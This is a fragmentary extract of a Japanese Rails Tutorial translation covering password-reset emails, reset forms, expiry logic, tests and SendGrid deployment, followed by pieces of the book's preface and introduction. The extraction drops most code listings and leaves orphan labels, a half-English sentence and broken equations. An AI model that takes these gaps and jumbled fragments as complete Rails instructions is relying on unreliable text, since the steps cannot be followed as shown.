図\ref{fig:invalid_email_password_reset}に示すように、この時点でのアプリケーションは、無効なメールアドレスを入力した場合に正常に動作します。
正しいメールアドレスを送信した場合にもアプリケーションが正常に動作するためには、パスワード再設定のメイラーメソッドを定義する必要があります。
「forgot password」フォームに無効なメールアドレスを入力した場合
リスト\ref{code:user_model_password_reset}でパスワード再設定のメールを送信するコードは、以下の部分です。
上のコードが動作するために必要な�パスワード再設定用メイラーメソッドは、\ref{sec:account_activation_mailer}で開発したアカウント有効化用メイラーメソッドとほぼ同じです。
最初にユーザーメイラーに\kode{password\_reset}メソッドを作成し (リスト\ref{code:mail_password_reset})、続いてテキストメールのビューテンプレート (リスト\ref{code:password_reset_text}) と HTMLメールのビューテンプレート (リスト\ref{code:password_reset_html}) をそれぞれ定義します。
パスワード再設定のリンクをメール送信する
パスワード再設定のテンプレート (テキストメール)
<n><n>If you did not request your password to be reset, please ignore this email and<n>your password will stay as it is.
パスワード再設定のテンプレート (HTMLメール)
アカウント有効化メールの場合 (\ref{sec:account_activation_mailer}) と同様、Railsのメールプレビュー機能でパスワード再設定のメールをプレビューしましょう。
そのためのコードはリスト\ref{code:account_activation_preview}と基本的にまったく同じです (リスト\ref{code:password_reset_preview})。
パスワード再設定のプレビューメソッド (動作可能)
リスト\ref{code:password_reset_preview}のコードで、HTMLメールとテキストメールをそれぞれプレビューできるようになります (図\ref{fig:password_reset_html_preview}と図\ref{fig:password_reset_text_preview})。
パスワード再設定メールのプレビュー (HTMLバージョン)
パスワード再設定メールのプレビュー (テキストバージョン)
アカウント有効化メイラーメソッドのテスト (リスト\ref{code:real_account_activation_test}) の場合と同様、パスワード再設定用メイラーメソッドのテストを書くことにします (リスト\ref{code:password_reset_mailer_test})。
ただし、有効化トークンの場合と異なり、パスワード再設定用トークンはビューの中で使用される点にご注意ください。有効化トークンは\kode{before_create}コールバックでユーザーひとりひとりに対して作成されます (リスト\ref{code:user_model_activation_code}) が、パスワード再設定用用トークンの方はユーザーが「forgot password」フォームを送信できた場合にだけ作成されます。
この動作は統合テストで自然に行われます (リスト\ref{code:password_reset_integration_test}) が、このテストではパスワード再設定用トークンを手動で作成する必要があります。
パスワード再設定用メイラーメソッドのテストを追加する 
リスト\ref{code:mail_password_reset}、リスト\ref{code:password_reset_text}、リスト\ref{code:password_reset_html}のコードを使用すると、正しいメールアドレスを送信したときの画面は図\ref{fig:valid_email_password_reset}のようになります。
このメールはサーバーログではリスト\ref{code:password_reset_email}のように表示されます。
有効なメールアドレスを送信した場合
サーバーログに表示されたパスワード再設定メールの例
Sent mail to michael@michaelhartl.com (66.8ms)<n>Date: Thu, 04 Sep 2014 01:04:59 +0000<n>From: noreply@example.com<n>To: michael@michaelhartl.com<n>Message-ID: <5407babbee139_8722b257d04576a@mhartl-rails-tutorial-953753.mail><n>Subject: Password reset<n>Mime-Version: 1.0<n>Content-Type: multipart/alternative;<n> boundary="--==_mimepart_5407babbe3505_8722b257d045617";<n> charset=UTF-8<n>Content-Transfer-Encoding: 7bit<n><n><n>----==_mimepart_5407babbe3505_8722b257d045617<n>Content-Type: text/plain;<n> charset=UTF-8<n>Content-Transfer-Encoding: 7bit<n><n>To reset your password click the link below:<n><n>http://rails-tutorial-c9-mhartl.c9.io/password_resets/3BdBrXeQZSWqFIDRN8cxHA/<n>edit?
email=michael%40michaelhartl.com<n><n>This link will expire in two hours.
<n>----==_mimepart_5407babbe3505_8722b257d045617<n>Content-Type: text/html;<n> charset=UTF-8<n>Content-Transfer-Encoding: 7bit<n><n><h1>Password reset</h1><n><n><p>To reset your password click the link below:</p><n><n><a href="http://rails-tutorial-c9-mhartl.c9.io/<n>password_resets/3BdBrXeQZSWqFIDRN8cxHA/<n>edit?
email=michael%40michaelhartl.com">Reset password</a><n><n><p>This link will expire in two hours.</p><n><n><p><n>If you did not request your password to be reset, please ignore this email and<n>your password will stay as it is.
<n></p><n>----==_mimepart_5407babbe3505_8722b257d045617--
以下のようなフォームリンクが動作するためには、
http://example.com/password_resets/3BdBrXeQZSWqFIDRN8cxHA/edit?email=foo%40bar.com
パスワード再設定のフォームが必要です。
この作業はユーザーのeditビューでユーザーを更新する (リスト\ref{code:user_edit_view}) のと似ていますが、今回はパスワード入力フィールドと確認用フィールドだけを使います。
今回は少しだけ面倒な点があります。メールアドレスをキーとしてユーザーを検索するということは、\kode{edit}アクションと\kode{update}アクションの両方でメールアドレスが必要になるということです。
例のメールアドレス入りリンクのおかげで、\kode{edit}アクションでメールアドレスを取り出すのは問題ありません。しかしフォームを送信するとこの値は消えてしまいます。この値はどこに保持しておくのがよいのでしょうか。
このメールアドレスの最適な保存方法は、\emph{隠しフィールド}としてページ内に保存することです。これにより、フォームを送信すると他の情報と一緒にメールアドレスが送信されます。
作成したコードをリスト\ref{code:password_reset_form}に示します
パスワード再設定のフォーム
リスト\ref{code:password_reset_form}では以下のフォームタグヘルパーを使用している点にご注意ください。
これは、再設定用のリンクをクリックすると、前者ではメールアドレスが\kode{params[:email]}に保存されますが、後者を使用すると\kode{params[:user][:email]}に保存されてしまうからです。
今度は、このフォームを出力 (レンダリング) するためにPasswordResetsコントローラの\kode{edit}アクション内で\kode{@user}インスタンス変数を定義する必要があります。
アカウント有効化 (リスト\ref{code:account_activation_edit_action}) の場合と同様、\kode{params[:email]}にあるメールアドレスに対応するユーザーをこの変数に保存します。
\kode{edit}アクションと\kode{update}アクションのどちらの場合も正当な\kode{@user}が存在する必要があるので、いくつかのbeforeフィルタを使用して@userの検索とバリデーションを行います (リスト\ref{code:password_reset_edit_action})。
パスワード再設定の\kode{edit}アクション
有効なユーザー
リスト\ref{code:password_reset_edit_action}では以下のコードを使用しています。
このコードはリスト\ref{code:generalized_current_user}で使用されていました。もうひとつ、
これはリスト\ref{code:account_activation_edit_action}で使用されていました。
いずれの場合も、表\ref{table:password_token_digest}の認証メソッドを完了します。
上のコードを使用することで、リスト\ref{code:password_reset_email}のログにあるリンクを開いたときにパスワード再設定のフォームが出力されるようになります。
実行結果を図\ref{fig:password_reset_form}に示します。
パスワード再設定のフォーム
リスト\ref{code:password_reset_edit_action}の \kode{edit}アクションに対応する \kode{update}アクションを定義するには、4通りの場合分けに対応する必要があります: パスワード再設定の期限が切れている場合、更新に成功した場合、更新が失敗した場合 (パスワードが正しくないなど)、更新が失敗した場合 (一見更新が成功したように見えるがパスワードが2つとも空欄) です。
1番目は\kode{edit}アクションと \kode{update}アクションの両方で対応する必要があるため、論理的にはbeforeフィルタで行うべきです (リスト\ref{code:password_reset_update_action})。
2番目と3番目はメインの\kode{if}文の2つの分岐に対応します (リスト\ref{code:password_reset_update_action})。
editフォームはActive Recordモデルオブジェクト (ユーザーなど) を変更するので、エラーメッセージの出力にリスト\ref{code:password_reset_form}の一部を共有できます。
この場合、パスワードフィールドが空である場合だけを扱います。パスワードの確認フィールドが空の場合は、確認フィールドのバリデーションで検出され、エラーメッセージが表示されるので不要です。ただし、パスワードフィールドとパスワード確認フィールドが両方空だとバリデーションがスキップされてしまいます。
エラー
パスワード再設定の\kode{update}アクション
update
# Before actions
リスト\ref{code:password_reset_update_action}の実装では以下のコードを使用して、パスワード再設定の期限切れの論理値テストをUserモデルに委譲 (delegate) しています。
このTo get this to work, we need to define the \kode{password\_reset\_expired?}
\ref{sec:password_reset_mailer}のメールテンプレートのところで説明したように、パスワード再設定の期限を設定し、2時間以上パスワードが再設定されなかった場合は期限切れにする必要があります。これをRubyで表現すると以下のようになります。
この「\kode{<}」記号を「〜より少ない」と読んでしまうと、「パスワード再設定メール送信時から経過した時間が、2時間より少ない場合」となってしまい、ここで行おうとしていることと反対の意味になってしまいます。
「\kode{<}」はここでは「〜より早い時刻」と読んでください。これなら「パスワード再設定メールの送信時刻が、現在時刻より2時間以上前の場合」となり、
\emph{期待どおり}の条件となります。そして条件が満たされるとリスト\ref{code:user_model_password_reset_expired}の\kode{password\_reset\_expired?}メソッドが実行されます
(この比較の公式な証明を\ref{sec:expiration_proof}に付録として追加しました)。
# パスワード再設定の期限が切れている場合はtrueを返す
リスト\ref{code:user_model_password_reset_expired}のコードを使用すると、リスト\ref{code:password_reset_update_action}の \kode{update} アクションが動作するようになります。
送信が無効だった場合と有効だった場合の画面をそれぞれ図\ref{fig:password_reset_failure}と図\ref{fig:password_reset_success}に示します
(確認のために2時間も待っていられないので、テストにはもうひとつ分岐を追加しますが、これは\ref{sec:activation_resets_exercises}の演習に回すことにします)。
パスワードの再設定が失敗した場合
パスワードの再設定が成功した場合
この節では、リスト\ref{code:password_reset_update_action}の2つ (または3つ) の分岐、つまり送信に成功した場合と失敗した場合の統合テストを作成します
(前述のとおり、3番目の場合については演習に回します)。
まずはパスワード再設定のテストファイルを生成しましょう。
      create
パスワード再設定をテストする手順は、アカウント有効化のテスト (リスト\ref{code:signup_with_account_activation_test}) と多くの共通点がありますが、テストの冒頭部分には次のような違いがあります: 最初に「forgot password」フォームを表示して無効なメールアドレスを送信し、次はそのフォームで有効なメールアドレスを送信します。後者ではパスワード再設定用トークンが作成され、再設定用メールが送信されます。
続いて、メールのリンクを開いて無効な情報を送信し、次にそのリンクから有効な情報を送信して、それぞれが期待どおりに動作することを確認します。
作成したテストをリスト\ref{code:password_reset_integration_test}に示します。このテストはコードリーディングのよい練習台になりますので、みっちりお読みください。
パスワード再設定の統合テスト
パスワード
リスト\ref{code:password_reset_integration_test}で使用されているアイデアの大半は、本チュートリアルで既出です。今回の新しい要素は\kode{input}タグぐらいでしょう。
上のコードは、\kode{input}タグに正しい名前、type="hidden"、メールアドレスがあるかどうかを確認します。
リスト\ref{code:password_reset_integration_test}のコードを使用すると、テストコードは \passing になるはずです。
アカウント有効化とパスワード復旧の最大の山場であるこのセクションでは、いよいよproduction (本番) 環境でアプリケーションからメールを送信します。
最初に無料のサービスを利用してメールを送信し、続いてアプリケーションの設定とデプロイを行います。
production環境からメール送信するために、「SendGrid」というHerokuアドオンを使用してアカウントを検証します
(このアドオンを使用するにはHerokuアカウントにクレジットカードを設定する必要がありますが、アカウント検証では料金は発生しません)。
アドオンをアプリに追加するには、以下のコマンドを実行します。
(訳注: herokuコマンドのバージョンが古いとここで失敗するかもしれません。その場合は、Heroku Toolbelt ( https://toolbelt.heroku.com/ ) を使って最新版に更新するか、次の古い文法のコマンドを試してみてください: \$ heroku addons:add sendgrid:starter ) [BR]<n>[BR]<n>アプリケーションでSendGridアドオンを使用するには、production環境の\href{https://en.wikipedia.org/wiki/Simple_Mail_Transfer_Protocol}{SMTP}に情報を記入する必要があります。
リスト\ref{code:sendgrid_config}に示したとおり、本番Webサイトのアドレスを\kode{host}変数に定義する必要もあります。
production環境のRailsでSendGridを使用する設定
config/environments/production.rb
=> true
リスト\ref{code:sendgrid_config}のメール設定にはSendGridアカウントの\kode{user\_name}と\kode{password}設定を記入する行もありますが、そこには記入せず、必ず環境変数「\kode{ENV}」に設定するよう十分ご注意ください。
本番運用するアプリケーションでは、暗号化されていないIDやパスワードのような重要なセキュリティ情報は「絶対に」ソースコードに直接書き込まないでください。そのような情報は環境変数に記述し、そこからアプリケーションに読み込む必要があります。
今回の場合、そうした変数はSendGridアドオンが自動的に設定してくれますが、\ref{sec:image_upload_in_production}では環境変数を自分で設定しなければなりません。
参考までに、リスト\ref{code:sendgrid_config}で使用するHerokuの環境変数を表示するには、以下のコマンドを実行します。
この時点で、Gitのトピックブランチをmasterにマージしておきましょう。
$ bundle exec rake test<n>$ git add -A<n>$ git commit -m "Add password resets & email configuration"<n>$ git checkout master<n>$ git merge account-activation-password-reset
続いてリモートリポジトリにプッシュし、Herokuにデプロイします。
$ bundle exec rake test<n>$ git push<n>$ git push heroku<n>$ heroku run rake db:migrate
Herokuへのデプロイが完了したら、自分が管理しているメールアドレスを使用して、production環境のサンプルアプリケーションでユーザー登録を行ってみましょう。
\ref{sec:account_activations_resource}で実装した有効化メールが配信されるはずです (図\ref{fig:activation_email_production})。
また、パスワードを忘れた時の再設定手順も\ref{sec:password_reset}で実装したとおりに動作するはずです (図\ref{fig:reset_email_production})。
production環境から送信したアカウント有効化メール
production環境から送信したパスワード再設定メール
アカウント有効化機能とパスワード再設定の機能が追加されたことで、ついにサンプルアプリケーションの登録、ログイン、ログアウト機能がすべて本格的に実装完了しました。
\emph{Railsチュートリアル}のこの後の章では、Twitterのようなマイクロポスト機能 (第\ref{cha:user_microposts}章) と、フォロー中のユーザーの投稿のステータスフィード機能 (第\ref{cha:following_users}章) の基本的な部分をサイトに搭載することにしましょう。
それらの章では、Railsの強力な機能 (画像アップロード、カスタムのデータベースクエリ、\kode{has\_many}や\kode{has\_many :through}を使用した高度なデータベースモデリングなど) を多数紹介する予定です。
<n><n>\subsection{本章のまとめ} % (fold)<n>\label{sec:activation_resets_what_we_learned_in_this_chapter}<n><n>\begin{itemize}<n><n>\item 
アカウント有効化は Active Recordオブジェクトではないが、セッションの場合と同様に、リソースでモデル化できる。
メール送信のためのActive Mailerアクションやビューの生成機能がRailsに備わっている。
Action MailerではテキストメールとHTMLメールを両方利用できる。
メイラーアクションで定義したインスタンス変数は、他のアクションやビューと同様、メイラーのビューから参照できる。
パスワードの再設定は Active Recordオブジェクトではないが、セッションやアカウント有効化の場合と同様に、リソースでモデル化できる。
アカウント有効化やパスワード再設定では、ユーザーを有効化したりパスワードを再設定するために一意のURLを作成する。一意のURLには生成したトークンが使用される。
メイラーのテストと統合テストは、どちらもUserメイラーの振舞いを確認するのに有用。
SendGridを使用するとproduction環境からメールを送信できる。
リスト\ref{code:password_reset_update_action}のテンプレートを埋めて、期限切れのパスワード再設定のブランチ (リスト\ref{code:password_reset_expire_test}) の統合テストを作成してください
(10.57 のコードにある\kode{response.body}は、そのページのHTML本文をすべて返すメソッドです)。
期限切れのテスト方法はさまざまですが、リスト\ref{code:password_reset_expire_test}でおすすめした手法 (大文字小文字は区別されません) を使えば、レスポンスの本文に「expired」という語があるかどうかをチェックできます。
現在は、/usersのユーザーインデックスページを開くと\emph{すべての}ユーザーが表示され、/users/:idのようにIDを指定すると個別のユーザーを表示できます。しかし考えてみれば、有効でないユーザーは表示する意味がありません。
これはリスト\ref{code:show_only_active_users_exercise}で使用されていました。
&&とandの動作は「ほぼ」同等ですが、&&演算子の方がandよりも\href{http://en.wikipedia.org/wiki/Order_of_operations#Programming_languages}{\emph{優先順位}}が高いので、&&だと\kode{root_url}との論理的な結び付きが強くなりすぎてしまい、不適切です。
\kode{root_url}をかっこで囲んでこの問題を回避することもできますが、\kode{and}を使用する方が常道です。
\emph{応用問題}: /usersと/users/:id両方の統合テストを作成してください。
リスト\ref{code:update_columns}のテンプレートに記入することで、個別の\kode{update_attribute}呼び出しを単一の\kode{update_columns}呼び出しに統合し、データベースアクセスが1回で済むようにしてください。
変更後にテストを実行し、 \passing になることを確認してください。
パスワード再設定の期限切れのテスト
有効なユーザーだけを表示するコードのテンプレート
index
\kode{update_columns}を使用するテンプレート
この説では、\ref{sec:resetting_the_password}で用いたパスワード期限切れの期間の比較が正しいことを証明します。
最初に、期間を2つ定義します。
パスワードの再設定は、メールが送信された時刻から経過した期間が、有効期間よりも長くなった場合に「期限切れ」となります。これを次のように表します。
\begin{equation}<n>\label{eq:time_delta}<n>\Delta t_r > \Delta t_e.
<n>\end{equation}
\begin{equation}<n>\label{eq:delta_p}<n>\Delta t_r = t_N - t_r<n>\end{equation}
\begin{equation}<n>\label{eq:delta_e}<n>\Delta t_e = t_N - t_e.
\begin{equation}<n>\label{eq:time_comparison}<n>t_r < t_e.
\ref{sec:resetting_the_password}でも説明したとおり、「\kode{<}」を「〜より少ない」ではなく「〜より早い時刻」と解釈すれば、「パスワードの再設定は、現在より2時間以上前の時刻に行われた」という言明と一致します。
\emph{Ruby on Rails チュートリアル}は、私の以前の著書「\emph{RailsSpace}」と、その時の共著者の \href{http://aure.com/}{Aurelius Prochazka} から多くのことを参考にさせてもらっています。
Aure には、RailsSpace での協力と本書への支援も含め、感謝したいと思います。
また、\emph{RailsSpace} と \emph{Rails チュートリアル}の両方の編集を担当して頂いた Debra Williams Cauley 氏にも謝意を表したく思います。彼女が野球の試合に連れて行ってくれる限り、私は本を書き続けるでしょう。
最後に、ここに書ききれないほど多くの読者からバグ報告や提案を頂きました。彼ら／彼女らのおかげで、本書を可能な限り良い本に仕上げることが出来ました。
『\href{http://www.railstutorial.org/book}{\emph{Ruby on Railsチュートリアル: RailsでWeb開発を学ぶ}}』へようこそ。
本チュートリアルは、カスタムWebアプリケーションの開発方法を教えるために書かれました。そのためのツールとして、かの有名な\href{http://rubyonrails.org}{Ruby on Rails}というWebフレームワークを採用しています。
Ruby on Rails 3.2 チュートリアル
さらに、本チュートリアルはWeb開発のベテランにとっても有用です。MVCやREST、ジェネレータ、マイグレーション、ルーティング、ERBなど、Railsフレームワークのコア技術を本チュートリアルでまとめて学ぶことができます。
いずれの場合であっても、\emph{Ruby on Railsチュートリアル}を最後まで終えることができれば、Rails周辺のさらに高度な内容の書籍、ブログ、スクリーンキャストなどを読み解く力を身に付けられます
\emph{Ruby on Railsチュートリアル}では、一貫したWeb開発技法を学ぶために 3 つのサンプルアプリケーションを作ります。\emph{hello}アプリ (\ref{sec:the_hello_application})、もう少しだけ複雑な\emph{toy}アプリ (第\ref{cha:a_toy_app}章)、実践的な\emph{sample}アプリ (第\ref{cha:static_pages}章から第\ref{cha:following_users}章まで) です。
アプリ名をあえて具体的にしていないことからわかるように、\emph{Ruby on Railsチュートリアル}で開発するアプリケーションでは、特定のWebサービスに偏らない一般的な記述を心がけており、読者の目的にかかわらず本チュートリアルでWeb開発の基礎を学ぶことができます。とは言うものの、最終的なサンプルアプリケーションは (初期はRailsで実装されていた) \href{http://twitter.com/}{某ソーシャルマイクロブログサイト}と「偶然にも」とてもよく似ていますが。
\emph{Ruby on Railsチュートリアル}でWeb開発を学ぶうえでどんな基礎知識が必要なのか (=どのぐらい素人でも大丈夫なのか) という質問をよくいただきます。
\ref{sec:prerequisites}でも詳しく解説しているとおり、Web開発はまったくの初心者がちょっと頑張っただけで簡単に学べるようなものではありません。
当初、本チュートリアルはある程度のプログラミング経験とWeb開発経験がある読者を対象にしていましたが、現在は開発初心者を含めたより多くの読者を対象とするように書き直しました。
初心者が学びやすくするために
\emph{Ruby on Railsチュートリアル}第3版では、Railsを学びやすくするためにさまざまな工夫をこらしました。
インストールや設定などに関する多くのわずらわしい問題を回避するため、クラウド開発を標準で採用しました (\ref{sec:up_and_running})。
旧版チュートリアルで依存していた多くの外部ライブラリ (RSpec、Cucumber、Capybara、Factory Girl) を廃止しました。
テスティングをなるべく簡便かつ柔軟性の高い方法に代えました。
Spork、RubyTestの面倒な設定は、なるべく後回しにするか廃止しました。
Railsの特定のバージョンでしか使えない機能の記述を減らし、その分、Web開発全般で通用する原理原則についての記述を増やしました。
大改訂を行った\emph{Ruby on Railsチュートリアル}第3版が、以前の版よりもさらに多くの読者にとって役立つことを願っています。
第1章では、最初に必要なソフトウェアをインストールし、開発環境 (\ref{sec:up_and_running}) を整えてRuby on Railsを動かす準備をします。
次に\kode{hello\_app}というRailsアプリの最初のサンプル作成に取りかかります。
\emph{Railsチュートリアル}では、ソフトウェア開発の現場で即座に通用するベストプラクティスを学ぶために、新しいRailsプロジェクトを作成した直後にGit (\ref{sec:version_control}) を使ったバージョン管理を行います。
第1章の最後には、作成したアプリを早々に本番 (production) 環境 (\ref{sec:deploying}) に\emph{デプロイして一般公開する}ところまで実践します。
第\ref{cha:a_toy_app}章では、Railsアプリケーションの基本的な仕組みを体験するために、別のプロジェクトを作成します。
\emph{URI}はUniform Resource Identifierの略です。それよりやや一般性の低い\emph{URL}はUniform Resource Locatorの略です。
URIは、要するに「ブラウザのアドレスバーにあるあれ」と考えればだいたい合っています。
第3章以降では、いよいよ本格的な大規模\emph{サンプルアプリケーション} (\kode{sample\_app} )を開発します。自動生成コードは使わずに、ゼロからコードを書き進めます。
サンプルアプリケーションの開発では、「モックアップ」「テスト駆動開発 (TDD)」「統合テスト」の3つの手法を採り入れます。
第\ref{cha:static_pages}章では静的なページを作成し、そこに動的な要素を順次追加していきます。
次の第\ref{cha:rails_flavored_ruby}章では少し回り道をし、Railsを支えているRubyという言語について簡単に学びます。
第\ref{cha:filling_in_the_layout}章から第\ref{cha:account_activation_and_password_reset}章にかけて、レイアウト、ユーザーのデータモデル、ユーザー登録/認証システムを順に作成し、サンプルアプリケーションの基本的な部分を実装します。
最後の第\ref{cha:user_microposts}章と第\ref{cha:following_users}章では、マイクロブログ機能とソーシャル機能を実装し、実際に動作するWebサイトを完成させます。
お手軽すぎるScaffoldの甘い誘惑
Railsの作者David Heinemer Hansson氏による有名な動画「\href{http://www.youtube.com/watch?v=Gzj723LkRJY}{15分で作るブログ} (英語)」が強い印象を与えたおかげで、Railsは立ち上げ当初から一気に盛り上がりました。
この後にも続々同じような動画が作られていますが、いずれもRailsの能力の一端を垣間見るにはうってつけなので、ぜひ一度ご覧ください。
ただし、動画では「15分でブログを作る」ために\emph{Scaffold}というお手軽生成機能を使っています。Railsの魔法のような\kode{generate scaffold}コマンドで\emph{自動生成したコード}があるからこそ、このような早業が可能なのです。
実際、筆者はRuby on Rails のチュートリアルを書きながら、あまりにも\href{http://en.wikipedia.org/wiki/Dark_side_(Star_Wars)}{お手軽にコードを生成できる} (訳注: 原文の「quicker, easier, more seductive」は、スターウォーズ・エピソードVのヨーダの台詞の引用) scaffoldの機能を使う誘惑にかられることが何度もありました。
しかし、自動生成されたコードは無駄に量が多く複雑で、Rails初心者には向いていません。たとえ運よく動いたとしても、正常に動いている理由を解明するのはおそらく無理です。
scaffoldの自動生成コードに頼っている限り、コード自動生成の達人にはなれるかもしれませんが、Railsに関する実践的な知識はほとんど身に付きません。
\emph{Ruby on Railsチュートリアル}では、より実践的な知識を身につけるために、Scaffoldとほぼ逆のアプローチで開発を進めていきます。具体的には、第\ref{cha:a_toy_app} 章で作成する簡単なデモアプリではscaffoldを使いますが、\emph{このチュートリアル}の中核である第\ref{cha:static_pages}章以降のサンプルアプリケーションからは、scaffoldを一切使わずに開発を進めていきます。
scaffold を使わない代わりに、開発の各ステップで、手頃な\emph{一口サイズ}のコードを書いてもらいます。この一口サイズのコードは、無理なく理解できる程度にシンプルで、かつ、ある程度の歯ごたえとやりがいを得られるように配慮してあります。
各ステップで理解する必要のあるコードの量はわずかですが、こうした理解を積み重ねていくことで、最終的にRailsの知識を高いレベルで身につけられるように構成されています。このようにして得た深い知識は柔軟性が高く、どのようなWebアプリを作成する時にも応用が効きます。
<n><n>\end{aside}<n><n>\section{はじめに} % (fold)<n>\label{sec:introduction}<n><n>
Ruby on Rails (単に「Rails」と呼ぶこともあります) は、Rubyプログラミング言語で記述された、Web開発フレームワークです。
Ruby on Railsは2004年にデビューして以来、急速に成長していきました。現在では、動的なWebアプリケーションを開発するフレームワークとして、最も有力かつ人気のあるフレームワークの１つになっています。
\href{http://airbnb.com/}{Airbnb}、\href{http://basecamp.com/}{Basecamp}、\href{http://disney.com/}{Disney}、\href{http://github.com/}{GitHub}, \href{http://hulu.com/}{Hulu}、\href{http://kickstarter.com/}{Kickstarter}、\href{http://shopify.com/}{Shopify}、\href{http://twitter.com/}{Twitter}、\href{http://yellowpages.com/}{Yellow Pages}など多くの企業でRailsが採用されています。
他にも、\href{http://entp.com/}{ENTP}や\href{http://thoughtbot.com/}{thoughtbot}、\href{http://pivotallabs.com/}{Pivotal Labs}、\href{http://hashrocket.com/}{Hashrocket}、\href{http://www.happyfuncorp.com/}{HappyFunCorp}といった、Railsを専門的に扱う会社も数多くあります。また、Railsを専門にしたフリーランスのコンサルタントやインストラクター、開発者については数えきれません。
Railsがこれだけ多くに人達に使われているのはなぜでしょうか。
また、Railsの設計が簡潔で美しいことも、Railsの成功を支えている秘訣の１つです。これを実現できたのは、Railsの背後で動いている\href{http://ruby-lang.org/}{Ruby}言語の驚異的な柔軟性のおかげです。具体的には、Webアプリケーションの作成に特化した\href{http://en.wikipedia.org/wiki/Domain_Specific_Language}{DSL (ドメイン固有言語)} を Ruby言語で実装していることにより、HTMLやデータモデルの生成、URL のルーティングなど、Webプログラミングで必要な多くの作業が簡単になります。その結果、Railsを使用してアプリケーションを開発すると、コードが簡潔になり、読みやすくなります。
さらに、Railsは最新のWebテクノロジーやフレームワーク設計に素早く適応しています。
たとえば、Railsは「REST」という設計思想の重要性をいち早く理解し、対応したフレームワークの１つです (RESTについては後ほど解説します)。
また、他のフレームワークで成功を収めた新しい技術があれば、Railsの創始者である\href{http://loudthinking.com/}{David Heinemeier Hansson} (DHH) や\href{http://rubyonrails.org/core}{Railsのコアチーム}は、そうしたアイデアを常に積極的に取り入れています。
印象的な例として、かつて互いにライバルの関係にあったMerbとRailsとの統合が挙げられます。この統合の結果、RailsはMerbのモジュール設計や安定した\href{http://en.wikipedia.org/wiki/Application_programming_interface}{API}、そしてパフォーマンスの向上など多くの恩恵を受けることができました。
最後に、Rails には、非常に熱心で多様なコミュニティがあります。
Railsコミュニティには、何百人ものオープンソース\href{http://contributors.rubyonrails.org/}{コントリビュータ}や、多くの参加者で賑わう\href{http://railsconf.com/}{カンファレンス}、膨大な数の\href{https://rubygems.org/}{gem} (ページネーションや画像アップロードといった特定の問題を解決するためのgemなど)、多くの情報を発信し続けるブログ、掲示板、IRCがあります。
このような熱心で多様なコミュニティのおかげで、開発中に何らかのエラーに遭遇したとしても、エラーメッセージをそのままGoogleで検索するだけで、関連するブログ記事や掲示板のスレッドをたちどころに見つけることができます。
これまでにも、驚くほど多くの初心者が\emph{Ruby on Railsチュートリアル}で学んできた実績があります。Web開発経験の少ない方も、まずは挑戦してみるのがよいと思います。
学習中に知識不足を実感する箇所が出てきたら、この後でご紹介する資料でいつでも学び直してから先に進めばよいのです。
「チュートリアルを2回通して行う」という方法もお勧めです。続けてもう一度やってみると、1回目のときよりもずっと知識が身に付いたことを実感できますし、2度目にはもっと短い時間で終えられるでしょう。
コマンド
「先にRubyを勉強してからRailsを学ぶ方が良いでしょうか？」という質問をよく受けます。
この質問への回答ですが、読者の学習スタイルやプログラミング経験次第で異なるため、一口には言えません。
Web開発を最初から体系的に学びたい方や、プログラミングの経験が全くない方は、やはり\href{http://pragprog.com/book/ltp2/learn-to-program}{\emph{Rubyを最初に学んでおく}}のがよいでしょう。Peter Cooperの『\href{http://www.amazon.com/gp/product/1430223634}{\emph{Beginning Ruby}}』がお勧めです。
その一方で、これからRailsで開発を始めようとする人は「とにかく\emph{Webアプリケーション}を作りたい！」と考えていることがほとんどなので、たった1つのWebページを作成するために分厚いRuby本を一気読みする気にはなれないでしょう。
本チュートリアルが自分にはまだまだ難しいと思う方には、\href{http://learn-rails.com/learn-ruby-on-rails.html}{\emph{Learn Ruby on Rails}} (Daniel Kehoe) や\href{http://mbsy.co/7Zdc7}{One Month Rails}を先に学んでおくとよいでしょう。どちらもまったくの初心者を対象としており、\emph{本チュートリアル}よりも敷居が低く設定されています。
本チュートリアルを読み終える頃には、取り組み前の知識量の多少にかかわらず、より高度なRailsの情報源を理解できるようになっているはずです。
その中でも特にお勧めのRailsの情報源を紹介します。
\href{http://mbsy.co/6VQ8l}{Code School}: プログラミングを対話的に学習できるコース
\href{http://www.gotealeaf.com/railstutorial}{Tealeaf Academy}: オンラインで受講できるRails開発ブートキャンプです。高度な資料も充実しています。
\href{http://www.thinkful.com/a/railstutorial}{Thinkful}: プロのエンジニアと組んでプロジェクトベースで授業を進めるオンラインクラスです。
\href{https://pragmaticstudio.com/refs/railstutorial}{Pragmatic Studio}: Mike ClarkとNicole Clarkが教鞭を執っているオンラインのRailsクラスです。
2006年に筆者が受講したRailsのコースでは、Mikeの他に\emph{Programming Ruby}の著者Dave Thomasも講師を務めていました
\href{http://railscasts.com/}{RailsCasts} (Ryan Bates) : 極めて質の高い (ほぼ) 無料のスクリーンキャストです。
\href{https://tutorials.railsapps.org/hartl}{RailsApps}: さまざまなRailsプロジェクトやチュートリアルがトピック別に詳しく特集されています。
\href{http://guides.rubyonrails.org/}{Railsガイド}: トピック毎に分類された最新のRailsリファレンスです (訳注: RailsGuidesの日本語版を「Railsガイド」と呼んでいます。)
本チュートリアルで使用している取り決めや表記は、説明不要なものがほとんどです。
ここでは、説明が必要と思われるものについてのみ補足します。
本チュートリアルでは、コマンドライン (ターミナル) のコマンド例が多用されています。
簡素化のため、次のようなUnixスタイルのプロンプト (行の頭に「\$」を表示するスタイル) を使用して、その例がコマンドラインであることを示しています。
"hello world"
\ref{sec:up_and_running}でも述べているように、本チュートリアルではUnixコマンドラインを最初から利用できるクラウド開発環境の利用 (\ref{sec:development_environment}) を、すべてのOSユーザー (特にWindows) の方におすすめしています。
Railsにはコマンドラインから実行するコマンドが多数あるので、最初からコマンドラインが利用できるクラウドは非常に便利です。
たとえば、\ref{sec:rails_server}では以下の\kode{rails server}コマンドでローカルdevelopment Webサーバーを実行しています。
$ rails server
\emph{Railsチュートリアル}におけるディレクトリの区切りは、コマンドラインのプロンプトと同様にUnixスタイルのスラッシュ「\kode{/}」を使っています。
たとえば、サンプルアプリケーション\kode{production.rb}の設定ファイルは以下のように表します
このようなファイルパスは、アプリケーションのルートディレクトリからの相対パスであると理解してください。ルートディレクトリの位置はシステムによって異なり、このクラウドIDE (\ref{sec:development_environment}) の場合は以下のようになります。
/home/ubuntu/workspace/sample_app/
この場合、\kode{production.rb}への絶対パスは以下のようになります。
\emph{Railsチュートリアル}では、様々なプログラムの出力結果 (シェルコマンド、バージョン管理ツール、Rubyプログラムの出力結果など) をこまめに記載するようにしています。
出力結果は、コンピュータシステムによって微妙に異なるので、本チュートリアルの出力結果と実際の出力が正確に一致するとは限りません。しかし、こうした細かい出力結果の差異が問題になることはないので、それほど気にする必要はありません。
